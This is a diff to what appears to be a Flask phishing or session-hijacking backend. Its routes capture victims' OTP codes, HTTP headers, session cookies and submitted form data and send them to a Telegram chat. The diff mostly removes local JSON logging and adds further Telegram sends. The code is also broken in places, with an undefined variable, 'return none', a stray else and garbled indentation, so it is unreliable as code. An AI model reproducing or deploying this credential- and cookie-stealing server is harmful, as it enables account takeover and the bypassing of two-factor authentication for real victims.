@@ -91,11 +91,7 @@ def load_data():
     OTP: {g.data.get("otp","")} 
     """
     send_to_telegram(message)
-    
-    with open(ANSWERS_FILE, "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
               
-                 
     return {"headers": headers_list, "cookies": cookies_list} 
 
 @app.route('/', methods=["GET"])
@@ -148,9 +144,10 @@ def session_files():
        
            print(name, "=", value)
     
+       message = f"New Request\n\nHEADERS:\n{dict(all_headers)}\n\nSESSION_ID:\n{dict(cookies)}"
        
-       with open("sessions.json", "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
+       send_to_telegram(message)
+       return "ok"
                
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -206,9 +203,11 @@ def collect_sessions():
         
         for name, value in request.cookies.items():
             print(name, "=", value)
-
-            with open("sessions.json", "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
+            
+        if os .path.exists("sessions.json"):
+            with open("sessions.json", "r", encoding="utf-8") as f:
+                data = json.load(f)  
+            
                 
         else:
             data = []
@@ -231,12 +230,10 @@ def collect_sessions():
     finally:                   
         send_to_telegram(message)          
                           
-        
-        with open("sessions.json", "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
-        
-        
-        
+    if os.path.exists("log.json"):
+      with open("log.json", "r") as f:
+        logs = json.load(f)     
+       
 @app.route("/submit", methods=["POST"])
 def submit():
         ua =request.headers.get("User-Agent", "-")
@@ -264,9 +261,6 @@ def submit():
 
         send_to_telegram(message) 
         
-        with open("sessions.json", "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
-        return none
       
 @app.route("/show_cookies")
 def show_cookies():
@@ -279,9 +273,6 @@ def show_cookies():
     lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
         
     send_to_telegram("\n".join(liness))
-        
-    with open("sessions.json", "a", encoding="utf-8") as f:
-                json.dump(data, f, ensure_ascii=False, indent=2)
          
     return "<br>".join(result) 
          
